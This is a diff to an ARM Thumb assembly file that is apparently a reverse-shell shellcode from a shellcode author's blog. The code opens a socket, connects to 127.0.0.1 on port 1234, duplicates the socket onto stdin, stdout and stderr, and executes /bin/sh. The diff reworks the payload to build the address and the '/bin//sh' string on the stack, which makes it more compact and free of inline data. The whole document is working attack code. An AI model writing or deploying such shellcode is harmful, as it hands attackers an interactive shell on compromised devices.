@@ -4,13 +4,19 @@
   
   http://modexp.wordpress.com/   
 */
-
+    .arch armv6
     .global _start
     .text
 
 _start:
-    // switch to thumb mode
+
     .code 32
+    ldr    r4,  =#0xD402FF02 // htons(1234), AF_INET
+    ldr    r5,  =#0x0100007f // 127.0.0.1
+    ldr    r9,  =#0x6e69622f // /bin
+    ldr    r10, =#0x68732f2f // //sh
+
+    // switch to thumb mode    
     add    r3, pc, #1
     bx     r3 
   
@@ -22,10 +28,13 @@ _start:
     lsl    r7, r1, #8  // multiply by 256
     add    r7, #25     // 256+25 = socket
     svc    1
-  
+
+    mov    r8, r0       // r8 = s
+    
     // connect(s, &sa, sizeof(sa));
-    mov    r6, r0       // r6 = s
-    adr    r1, sin_port // r1 = sa.sin_port
+    push   {r4, r5}     // save sa on stack
+    mov    r1, sp       // r1 = &sa
+    strb   r2, [r1, #1] // null the 0xFF in sa.family
     mov    r2, #16      // r2 = sizeof(sa)
     add    r7, #2       // r7 = 281+2 = connect
     svc    1
@@ -33,27 +42,19 @@ _start:
     // dup2(s, FILENO_STDIN);
     // dup2(s, FILENO_STDOUT);
     // dup2(s, FILENO_STDERR);
-    mov    r1, #2      // for 3 descriptors
-dup_loop:
+    mov    r1, #3      // for 3 descriptors
+c_dup:
     mov    r7, #63     // r7 = dup 
-    mov    r0, r6      // r0 = s
+    mov    r0, r8      // r0 = s
+    sub    r1, #1      // decrease r1    
     svc    1
-    sub    r1, #1      // 
-    bpl    dup_loop
+    bne    c_dup       // while (r1 != 0)
 
     // execve("/bin/sh", NULL, NULL);
-    adr    r0, sh        // r0 = "/bin/sh" 
-    // umull r1, r2, r0, r0
-    eor    r2, r2, r2    // r2 = NULL
-    eor    r1, r1, r1    // r1 = NULL
-    strb   r2, [r0, #7]  // add null terminator    
+    mov    r11, r2
+    push   {r9, r10, r11}
+    mov    r0, sp  
     mov    r7, #11       // r7 = execve
     svc    1
     nop                  // alignment by 4 bytes
-sin_port:    
-    .word  0xd2040002    // 1234, AF_INET
-sin_addr:
-    .word  0x0100007f    // 127.0.0.1
-sh:  
-    .ascii "/bin/shX"
-
+    
